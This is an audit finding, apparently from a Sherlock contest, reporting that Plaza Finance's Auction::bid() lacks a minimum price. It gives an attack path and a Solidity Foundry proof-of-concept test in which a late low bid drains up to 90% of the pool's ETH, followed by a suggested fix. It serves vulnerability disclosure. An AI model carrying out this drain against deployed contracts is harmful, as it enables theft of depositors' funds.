# Almost up to the sale limit of the pool's (ETHs) can be drained due to lack of start price the  in `Auction::bid()` function by making a likely undersold Auction a Successful Auction

### Summary

Lack of minimum price checking  (minimum ETH in terms of usdc) in `Auction:bid()` function will cause a significant loss of funds as attackers can turn a under sold auction to a successful auction by draining almost all funds( up to sale limit that is >= 90%)

### Root Cause

https://github.com/sherlock-audit/2024-12-plaza-finance/blob/14a962c52a8f4731bbe4655a2f6d0d85e144c7c2/plaza-evm/src/Auction.sol#L125C3-L171C4

### Internal Pre-conditions

1) When a auction is going to be under sold.  or huge amount of usdc needed to cover the bond holders but the auction can not attract many bidders to get the required the usdc amount.

### External Pre-conditions

_No response_

### Attack Path

Suppose 90% of the vault balance(ETH) is  1000 ETH.  max bid= 1,000. And 25000 usdc need to be raised for the bond holders. Slot size = 25
1. 24,975 usdc have been raised through many bids covering 10 ETH. and only 25 usdc needed .
2.  At the last moment attacker can place  a bid of 25 usdc against 990 ETH.
3. Attack call the `Auction:endAuction()` function to end the auction after end time period.
4.  The attacker then call `Auction:claimBid()` function to claim his ETHs.
### Impact

Almost complete loss of funds if there is no potential bidders to rescue. If there's legitimate bidders but can not cover the whole   usdc needed, then these low bidders would drain the protocol.

### PoC
Add this function in Auction.t.sol file 

```solidity
function testAuctionDrain() public {
        for (uint256 i = 1; i <= 100; i++) {
            address newBidder = address(uint160(i + 1));
            vm.startPrank(newBidder);
            usdc.mint(newBidder, 100 ether);
            usdc.approve(address(auction), 100 ether);
            auction.bid(1 ether, 1000000000);
            vm.stopPrank();
        }

        address attacker = address(0x1111);

        // getting total reserve token in the pool.
        uint256 PoolBalance = IERC20(
            address(Auction(auction).sellReserveToken())
        ).balanceOf(address(Auction(auction).pool()));

        uint256 saleLimit = (PoolBalance * 90) / 100;

        //after 9 days attacker plaing the bid
        vm.warp(block.timestamp + 9 days);

        vm.startPrank(attacker);
        //auction coupon amount
        uint256 auctionCouponAmount = Auction(auction).currentCouponAmount();
        //total coupon amount needed for the auction.
        uint256 totalBuyCouponAmount = Auction(auction).totalBuyCouponAmount();

        uint256 usdcNeeded = totalBuyCouponAmount - auctionCouponAmount;
        usdc.mint(attacker, usdcNeeded);

        usdc.approve(address(auction), usdcNeeded);

        uint256 index = auction.bid(saleLimit, usdcNeeded);

        vm.warp(block.timestamp + 12 days);
        Auction(auction).endAuction();

        Auction(auction).claimBid(index);
        vm.stopPrank();
    }

```

### Mitigation

As the principle of Auction is - the highest bidder would win. But There must have some minimum bidding price (base price like at least 500 or 1000 usdc for 1 eth or chainlink pirce feed can be helpful to determine base price) which would have prevented such a scenario.
